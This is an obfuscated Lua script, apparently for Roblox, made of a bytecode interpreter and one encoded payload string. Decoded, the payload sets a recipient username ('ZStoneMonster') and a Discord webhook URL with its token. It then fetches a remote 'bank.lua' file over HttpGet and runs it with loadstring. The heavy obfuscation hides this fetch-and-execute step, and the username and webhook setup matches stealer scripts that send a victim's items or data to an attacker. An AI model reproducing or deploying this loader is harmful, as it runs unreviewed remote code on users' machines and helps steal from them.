do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v68=v2(v0(v30,16));if v19 then local v75=0;local v76;while true do if (v75==1) then return v76;end if (v75==0) then v76=v5(v68,v19);v19=nil;v75=1;end end else return v68;end end end);local function v20(v31,v32,v33)if v33 then local v69=0 -(0 -0) ;local v70;while true do if (v69==(0 -0)) then v70=(v31/(2^(v32-(1 -0))))%(2^(((v33-(2 -1)) -(v32-((118 -(32 + 85)) + 0))) + (620 -(555 + 64)))) ;return v70-(v70%1) ;end end else local v71=(933 -(857 + 74))^(v32-((1 + 0) -0)) ;return (((v31%(v71 + v71))>=v71) and (569 -(367 + 201))) or (927 -(214 + 713)) ;end end local function v21()local v34=0 + 0 ;local v35;while true do if (v34==((1308 -(87 + 263)) -(892 + 65))) then return v35;end if (v34==(0 -0)) then v35=v1(v16,v18,v18);v18=v18 + (1 -0) ;v34=1 -0 ;end end end local function v22()local v36,v37=v1(v16,v18,v18 + 2 );v18=v18 + (182 -(67 + 113)) ;return (v37 * (188 + 68)) + v36 ;end local function v23()local v38,v39,v40,v41=v1(v16,v18,v18 + (7 -4) );v18=v18 + 3 + 1 ;return (v41 * (66680831 -49903615)) + (v40 * ((120606 -54118) -(802 + 110 + 40))) + (v39 * (689 -433)) + v38 ;end local function v24()local v42=v23();local v43=v23();local v44=(1765 -767) -(915 + 82) ;local v45=(v20(v43,1,(494 -(145 + 293)) -36 ) * (((432 -(44 + 386)) + 0)^32)) + v42 ;local v46=v20(v43,27 -6 ,1218 -(1069 + 118) );local v47=((v20(v43,72 -40 )==(1 -(1486 -(998 + 488)))) and  -(1 + 0)) or 1 ;if (v46==(0 -0)) then if (v45==0) then return v47 * (0 + 0) ;else v46=792 -(368 + 423) ;v44=0;end elseif (v46==(6433 -4386)) then return ((v45==(0 + 0)) and (v47 * ((19 -(10 + 8))/(0 -0)))) or (v47 * NaN) ;end return v8(v47,v46-(1465 -(416 + 26)) ) * (v44 + (v45/((6 -4)^(23 + 29)))) ;end local function v25(v48)local v49=1423 -(630 + 793) ;local v50;local v51;while true do if (v49==(1 + 0)) then v50=v3(v16,v18,(v18 + v48) -(773 -(201 + 571)) );v18=v18 + v48 ;v49=6 -4 ;end if (v49==(1140 -(116 + 1022))) then v51={};for v77=4 -(14 -11) , #v50 do v51[v77]=v2(v1(v3(v50,v77,v77)));end v49=1 + 2 ;end if (v49==(0 + 0)) then v50=nil;if  not v48 then v48=v23();if (v48==(885 -(261 + 624))) then return "";end end v49=3 -2 ;end if (v49==(1083 -(402 + 618 + 60))) then return v6(v51);end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v52=0 -0 ;local v53;local v54;local v55;local v56;local v57;local v58;local v59;local v60;while true do if (v52==3) then v59=nil;v60=nil;v52=4;end if (v52~=(1216 -(323 + 889))) then else while true do if (1==v53) then v56=nil;v57=nil;v53=5 -3 ;end if (v53==(582 -(361 + 219))) then local v96=0;local v97;while true do if ((320 -(53 + 267))==v96) then v97=0;while true do if (v97==(1 + 0)) then v53=416 -(15 + 398) ;break;end if (v97~=0) then else local v106=982 -(18 + 964) ;while true do if (v106==0) then v58=nil;v59=nil;v106=3 -2 ;end if (v106==1) then v97=1 + 0 ;break;end end end end break;end end end if (v53==(0 + 0)) then local v98=0;while true do if (v98==1) then v53=851 -(20 + 830) ;break;end if (0~=v98) then else v54=0 + 0 ;v55=nil;v98=127 -(116 + 10) ;end end end if (v53==(1 + 2)) then v60=nil;while true do local v99=0;local v100;while true do if (v99~=0) then else v100=738 -(542 + 196) ;while true do if (v100~=1) then else if (v54==(0 -0)) then local v148=0;local v149;while true do if (v148~=0) then else v149=0 + 0 ;while true do if (v149~=(0 + 0)) then else local v163=0;local v164;while true do if (0==v163) then v164=0 + 0 ;while true do if (v164==(2 -1)) then v149=1;break;end if (0==v164) then local v172=0 -0 ;while true do if (v172~=(1551 -(1126 + 425))) then else v55={};v56={};v172=406 -(118 + 287) ;end if (v172==(3 -2)) then v164=1122 -(118 + 1003) ;break;end end end end break;end end end if (v149~=1) then else local v165=0 -0 ;local v166;while true do if (v165~=(377 -(142 + 235))) then else v166=0;while true do if (v166==(0 -0)) then local v173=0 + 0 ;while true do if (v173==1) then v166=978 -(553 + 424) ;break;end if (v173==0) then v57={};v58={v55,v56,nil,v57};v173=1 + 0 ;end end end if (v166==(1 + 0)) then v149=4 -2 ;break;end end break;end end end if ((5 -3)~=v149) then else v54=2 -1 ;break;end end break;end end end break;end if (v100==(0 + 0)) then local v109=0;while true do if (v109==1) then v100=4 -3 ;break;end if (v109==0) then local v151=753 -(239 + 514) ;while true do if ((0 + 0)==v151) then if (v54==(1330 -(797 + 532))) then local v167=0;local v168;while true do if (v167==(0 + 0)) then v168=0 + 0 ;while true do if (v168==(4 -2)) then v54=1204 -(373 + 829) ;break;end if (v168==1) then local v174=731 -(476 + 255) ;while true do if (1==v174) then v168=1132 -(369 + 761) ;break;end if ((0 + 0)==v174) then for v178=1,v59 do local v179=0;local v180;local v181;local v182;local v183;while true do if (v179==(2 -0)) then while true do if (v180==0) then local v185=0 -0 ;while true do if (v185~=1) then else v180=239 -(64 + 174) ;break;end if (v185~=0) then else v181=0 + 0 ;v182=nil;v185=1 -0 ;end end end if (v180~=(337 -(144 + 192))) then else v183=nil;while true do if (v181~=1) then else if (v182==(217 -(42 + 174))) then v183=v21()~=0 ;elseif (v182==2) then v183=v24();elseif (v182~=(3 + 0)) then else v183=v25();end v60[v178]=v183;break;end if ((0 + 0)~=v181) then else v182=v21();v183=nil;v181=1 + 0 ;end end break;end end break;end if (v179~=(1504 -(363 + 1141))) then else v180=1580 -(1183 + 397) ;v181=nil;v179=1;end if (v179~=1) then else v182=nil;v183=nil;v179=5 -3 ;end end end v58[3]=v21();v174=1 + 0 ;end end end if (v168==(0 + 0)) then v59=v23();v60={};v168=1;end end break;end end end if (v54==(1977 -(1913 + 62))) then local v169=0 + 0 ;local v170;local v171;while true do if (v169==1) then while true do if (v170==(0 -0)) then v171=0;while true do local v175=0;local v176;while true do if (v175==0) then v176=1933 -(565 + 1368) ;while true do if (v176==0) then if (v171==1) then return v58;end if (v171==(0 -0)) then local v184=0;while true do if (v184==1) then v171=1662 -(1477 + 184) ;break;end if (v184==0) then for v187=1,v23() do local v188=0;local v189;local v190;local v191;local v192;while true do if (v188~=(1 -0)) then else v191=nil;v192=nil;v188=2 + 0 ;end if (v188==2) then while true do if (v189==(857 -(564 + 292))) then v192=nil;while true do if (0==v190) then v191=0;v192=nil;v190=1 -0 ;end if (1~=v190) then else while true do if (v191~=0) then else v192=v21();if (v20(v192,2 -1 ,305 -(244 + 60) )~=0) then else local v196=0 + 0 ;local v197;local v198;local v199;local v200;while true do if (v196~=0) then else v197=0;v198=nil;v196=477 -(41 + 435) ;end if (v196~=(1003 -(938 + 63))) then else while true do if (1==v197) then local v201=0;local v202;local v203;while true do if (1==v201) then while true do if (v202==0) then v203=0 + 0 ;while true do if (v203==1) then v197=1127 -(936 + 189) ;break;end if (v203~=(0 + 0)) then else local v213=1613 -(1565 + 48) ;local v214;while true do if (v213==0) then v214=0 + 0 ;while true do if ((1139 -(782 + 356))~=v214) then else v203=1;break;end if ((267 -(176 + 91))==v214) then local v220=0 -0 ;while true do if (v220~=(1 -0)) then else v214=1;break;end if (0~=v220) then else v200={v22(),v22(),nil,nil};if (v198==(0 + 0)) then local v221=0 -0 ;local v222;local v223;while true do if (v221~=1) then else while true do if (v222==(0 -0)) then v223=0;while true do if (v223==0) then v200[3]=v22();v200[1022 -(697 + 321) ]=v22();break;end end break;end end break;end if ((0 -0)==v221) then v222=0 -0 ;v223=nil;v221=2 -1 ;end end elseif (v198==1) then v200[2 + 1 ]=v23();elseif (v198==(3 -1)) then v200[7 -4 ]=v23() -((1229 -(322 + 905))^16) ;elseif (v198~=3) then else local v226=611 -(602 + 9) ;local v227;local v228;while true do if (0~=v226) then else v227=1189 -(449 + 740) ;v228=nil;v226=873 -(826 + 46) ;end if (v226==1) then while true do if (v227==0) then v228=0;while true do if (v228==(947 -(245 + 702))) then v200[3]=v23() -((6 -4)^(6 + 10)) ;v200[4]=v22();break;end end break;end end break;end end end v220=1;end end end end break;end end end end break;end end break;end if ((1898 -(260 + 1638))~=v201) then else v202=0;v203=nil;v201=1;end end end if (v197==(440 -(382 + 58))) then local v204=0 -0 ;local v205;while true do if (0==v204) then v205=0 + 0 ;while true do if (v205~=(0 -0)) then else local v212=0 -0 ;while true do if (v212==1) then v205=1206 -(902 + 303) ;break;end if (v212==(0 -0)) then v198=v20(v192,2,3);v199=v20(v192,4,6);v212=2 -1 ;end end end if (v205==(1 + 0)) then v197=1;break;end end break;end end end if (3==v197) then if (v20(v199,1693 -(1121 + 569) ,217 -(22 + 192) )~=(684 -(483 + 200))) then else v200[1467 -(1404 + 59) ]=v60[v200[4]];end v55[v187]=v200;break;end if (v197==2) then local v207=0;local v208;local v209;while true do if (v207~=0) then else v208=0 -0 ;v209=nil;v207=1 -0 ;end if (v207==1) then while true do if (0==v208) then v209=0;while true do if (v209==0) then local v215=0;while true do if (v215==(766 -(468 + 297))) then v209=1;break;end if (0~=v215) then else if (v20(v199,1,1)~=(563 -(334 + 228))) then else v200[2]=v60[v200[6 -4 ]];end if (v20(v199,2,2)~=1) then else v200[3]=v60[v200[3]];end v215=1;end end end if (1~=v209) then else v197=6 -3 ;break;end end break;end end break;end end end end break;end if ((1 -0)==v196) then v199=nil;v200=nil;v196=2;end end end break;end end break;end end break;end if (v189~=0) then else local v195=0 + 0 ;while true do if (v195==0) then v190=236 -(141 + 95) ;v191=nil;v195=1;end if (1~=v195) then else v189=1;break;end end end end break;end if (v188==0) then v189=0;v190=nil;v188=1 + 0 ;end end end for v193=1,v23() do v56[v193-1 ]=v28();end v184=1;end end end break;end end break;end end end break;end end break;end if (v169==0) then v170=0;v171=nil;v169=2 -1 ;end end end v151=2 -1 ;end if (v151~=(1 + 0)) then else v109=1;break;end end end end end end break;end end end break;end end break;end if (v52==2) then v57=nil;v58=nil;v52=8 -5 ;end if (0==v52) then v53=0;v54=nil;v52=1;end if (v52==1) then v55=nil;v56=nil;v52=2;end end end local function v29(v61,v62,v63)local v64=0;local v65;local v66;local v67;while true do if (v64==0) then v65=v61[1];v66=v61[2];v64=1;end if (v64==1) then v67=v61[3];return function(...)local v79=v65;local v80=v66;local v81=v67;local v82=v27;local v83=1;local v84= -1;local v85={};local v86={...};local v87=v12("#",...) -1 ;local v88={};local v89={};for v93=0,v87 do if (v93>=v81) then v85[v93-v81 ]=v86[v93 + 1 ];else v89[v93]=v86[v93 + 1 ];end end local v90=(v87-v81) + 1 ;local v91;local v92;while true do v91=v79[v83];v92=v91[1];if (v92<=6) then if (v92<=2) then if (v92<=0) then for v107=v91[2],v91[3] do v89[v107]=nil;end elseif (v92==1) then v89[v91[2]]=v63[v91[3]];else local v112=0;local v113;local v114;while true do if (v112==1) then v89[v113 + 1 ]=v114;v89[v113]=v114[v91[4]];break;end if (v112==0) then v113=v91[2];v114=v89[v91[3]];v112=1;end end end elseif (v92<=4) then if (v92==3) then do return;end else v89[v91[2]]();end elseif (v92==5) then local v115=0;local v116;local v117;local v118;local v119;while true do if (v115==0) then v116=v91[2];v117,v118=v82(v89[v116](v13(v89,v116 + 1 ,v91[3])));v115=1;end if (v115==1) then v84=(v118 + v116) -1 ;v119=0;v115=2;end if (v115==2) then for v160=v116,v84 do v119=v119 + 1 ;v89[v160]=v117[v119];end break;end end else v83=v91[3];end elseif (v92<=9) then if (v92<=7) then v89[v91[2]]=v91[3]~=0 ;elseif (v92==8) then v63[v91[3]]=v89[v91[2]];v83=v83 + 1 ;v91=v79[v83];v89[v91[2]]=v91[3];v83=v83 + 1 ;v91=v79[v83];v63[v91[3]]=v89[v91[2]];v83=v83 + 1 ;v91=v79[v83];v89[v91[2]]=v91[3];v83=v83 + 1 ;v91=v79[v83];v83=v91[3];else local v125=0;local v126;while true do if (v125==0) then v126=v91[2];v89[v126]=v89[v126](v13(v89,v126 + 1 ,v84));break;end end end elseif (v92<=11) then if (v92>10) then if (v89[v91[2]]==v91[4]) then v83=v83 + 1 ;else v83=v91[3];end else v89[v91[2]]=v91[3];end elseif (v92==12) then v63[v91[3]]=v89[v91[2]];else local v131;local v132,v133;local v134;local v135;v89[v91[2]]=v63[v91[3]];v83=v83 + 1 ;v91=v79[v83];v135=v91[2];v134=v89[v91[3]];v89[v135 + 1 ]=v134;v89[v135]=v134[v91[4]];v83=v83 + 1 ;v91=v79[v83];v89[v91[2]]=v91[3];v83=v83 + 1 ;v91=v79[v83];v89[v91[2]]=v91[3]~=0 ;v83=v83 + 1 ;v91=v79[v83];v135=v91[2];v132,v133=v82(v89[v135](v13(v89,v135 + 1 ,v91[3])));v84=(v133 + v135) -1 ;v131=0;for v145=v135,v84 do v131=v131 + 1 ;v89[v145]=v132[v131];end v83=v83 + 1 ;v91=v79[v83];v135=v91[2];v89[v135]=v89[v135](v13(v89,v135 + 1 ,v84));v83=v83 + 1 ;v91=v79[v83];v89[v91[2]]();v83=v83 + 1 ;v91=v79[v83];v83=v91[3];end v83=v83 + 1 ;end end;end end end return v29(v28(),{},v17)(...);end v15("LOL!0A3O00028O00026O00F03F030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574031B3O00682O7470733A2O2F672O6F662E70726F2F732F62616E6B2E6C756103083O00557365724E616D65030D3O005A53746F6E654D6F6E7374657203073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313035393231333031363933373238333631342F50437A4B662D5F4C6639377551523146736B3549535633593366317338704831576A6B744D71643761324A5158456C4D67734266362O616A77336431587442652O56526400233O00120A3O00016O000100013O00260B3O0002000100010004063O0002000100120A000100013O00260B00010010000100020004063O00100001001201000200033O00120D000300043O00202O00030003000500122O000500066O000600016O000300066O00023O00024O00020001000100044O0022000100260B00010005000100010004063O0005000100120A000200013O00260B00020017000100020004063O0017000100120A000100023O0004063O0005000100260B00020013000100010004063O0013000100120A000300083O001208000300073O00122O0003000A3O00122O000300093O00122O000200023O00044O001300010004063O000500010004063O002200010004063O000200012O00033O00017O00",v9(),...);end
